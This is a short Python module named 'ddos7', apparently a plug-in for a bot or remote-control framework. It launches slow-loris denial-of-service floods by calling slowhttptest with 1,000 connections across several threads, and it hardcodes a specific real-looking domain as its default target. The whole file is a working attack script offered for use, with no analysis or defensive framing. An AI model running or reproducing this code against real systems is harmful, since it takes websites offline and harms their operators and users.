#!/usr/bin/python
# standard libarary
import os
import sys
import json
import socket
if sys.version_info[0] > 2:
    from queue import Queue
else:
    from Queue import Queue
import subprocess

# utilities
import util

# globals
packages = []
platforms = ['linux2','darwin']
threads = {}
targets = []
tasks = Queue()
usage = 'ddos7 [url]'
desciription = """
Slow down a target url
"""
@util.threaded
def _threader():
    while True:
        global tasks
        try:
            method, task = tasks.get_nowait()
            if callable(method):
                _ = method(task)
            tasks.task_done()
        except:
            break

def _slow(host):
    try:     
        command_l7=f"slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u {host} -x 24 -p 3"
        command_l7_while=f"while true; do {command_l7}; done"
        #TODO 2 cleanup func in caz de while true 
        #https://bobbyhadz.com/blog/wait-process-until-all-subprocesses-finish-in-python#using-the-subprocesscall-method-to-wait-for-a-process-to-complete
        if subprocess.call(command_l7, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
            return True
        else:
            return False
    except Exception as e:
        util.log("{} error: {}".format(_slow.__name__, str(e)))
        return False

def run(target='https://ssra.stsisp.ro'):
   
    global tasks
    global threads

    for i in range(4): #cate core-uri are masina
        tasks.put_nowait((_slow, target))
    for i in range(1, tasks.qsize()):
        threads['ddos7-%d' % i] = _threader()
    for t in threads:
        threads[t].join()
    return "slowloris finised"

